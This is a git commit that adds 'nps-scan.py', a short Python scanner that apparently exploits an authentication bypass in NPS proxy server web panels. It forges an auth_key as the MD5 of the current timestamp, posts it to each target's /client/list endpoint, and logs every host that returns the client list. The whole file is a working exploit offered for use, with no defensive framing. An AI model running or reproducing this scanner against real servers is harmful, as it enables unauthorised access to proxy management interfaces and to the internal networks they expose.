30f2c3a4dcc2ff4d3a068c2e5a6592909d443003
小姜同學 <58814935+xiaojiangxl@users.noreply.github.com>
2022-08-05 11:23:53 +0800

    Create nps-scan.py

---
+++ nps-scan.py
@@ -0,0 +1,33 @@
+import time
+import hashlib
+import requests
+
+f=open("result.txt","a")
+
+#日志功能
+def log(f,str_log):
+    f.write(str_log+"\n")
+
+#获取客户端列表
+def getclientlist(host):
+    now = int(time.time())
+    m = hashlib.md5()
+    m.update(str(int(now)).encode("utf8"))
+    auth_key = m.hexdigest()
+    data={
+        'search':'',
+        'order':'asc',
+        'offset':'0',
+        'limit':'10',
+        'auth_key':auth_key,
+        'timestamp':str(now)
+    }
+    print(data)
+    if "http" not in host:
+        url="http://"+str(host)+"/client/list"
+    else: url=str(host)+"/client/list"
+    r=requests.post(url,data)
+    if r.status_code is 200:
+        log(f,host)
+        print("[success]"+url)
+        print(r.text)
